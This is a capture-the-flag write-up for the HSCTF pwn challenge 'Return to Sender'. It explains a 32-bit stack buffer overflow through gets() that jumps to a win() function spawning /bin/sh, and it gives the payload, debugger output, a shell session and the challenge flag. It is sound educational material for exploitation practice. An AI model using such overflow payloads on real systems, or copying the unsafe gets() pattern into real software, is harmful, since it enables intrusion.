## Problem info
<table>
  <tr>
    <td><strong>Name</strong></td>
    <td>Return to Sender</td>
  </tr>
  <tr>
    <td><strong>Category</strong></td>
    <td>Pwn</td>
  </tr>
  <tr>
    <td><strong>Message</strong></td>
    <td>Written by: Ptomerty<br>
Who knew the USPS could lose a letter so many times?<br>
<font color="F11766">nc pwn.hsctf.com 1234</font><br>
</td>
  </tr>
  <tr>
    <td><strong>Flags</strong></td>
    <td>hsctf{fedex_dont_fail_me_now}</td>
  </tr>
  <tr>
    <td><strong>Files</strong></td>
    <td>return-to-sender    return-to-sender.c </td>
  </tr>
  <tr>
    <td><strong>Tags</strong></td>
    <td></td>
  </tr>
  <tr>
    <td><strong>Hints</strong></td>
    <td>This might come in handy: https://en.wikipedia.org/wiki/Stack_buffer_overflow</td>
  </tr>
</table>

## Solution

After reading the source code, we see there is a nice target runs system(/bin/sh)
```
void win() {
	system("/bin/sh");
}
```

And the vulnerable function 'gets' lies in vuln:
```
void vuln() {
	char dest[8];
	printf("Where are you sending your mail to today? ");
	gets(dest);
	printf("Alright, to %s it goes!\n", dest);
}
```

Seemingly an easy ROP by bufferover flow would solve the problem. Check the program type:
```
$ file return-to-sender  
return-to-sender: ELF 32-bit LSB executable.
```
Keep in mind its a 32-bit executable.

Recall the source code assigned 8 bits for dest, therefore a reasonable predict for a 16bit input. Anyway gdb-peda the program.

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

gdb-peda$ info function
All defined functions:

Non-debugging symbols:
...
0x08049140  register_tm_clones
0x08049180  __do_global_dtors_aux
0x080491b0  frame_dummy
0x080491b6  win
0x080491e1  vuln
0x08049230  main
...
```

By checksec and function address, now we know where to go : win at `0x080491b6`

Therefore construct the payload by [pwning.py](./pwning.py), were the payload sketch would be

`payload = 'a'*0x10 + 'aaaa' + p32(0x080491b6)`

and then were successfully get /bin/sh:

```
$ python pwning.py
[+] Opening connection to pwn.hsctf.com on port 1234: Done
[*] Switching to interactive mode
Where are you sending your mail to today? Alright, to aaaaaaaaaaaaaaaaaaaa\xb6\x91\x0 it goes!
$ ls
bin
dev
flag
lib
lib32
lib64
return-to-sender
return-to-sender.c
$ cat flag
hsctf{fedex_dont_fail_me_now}
``` 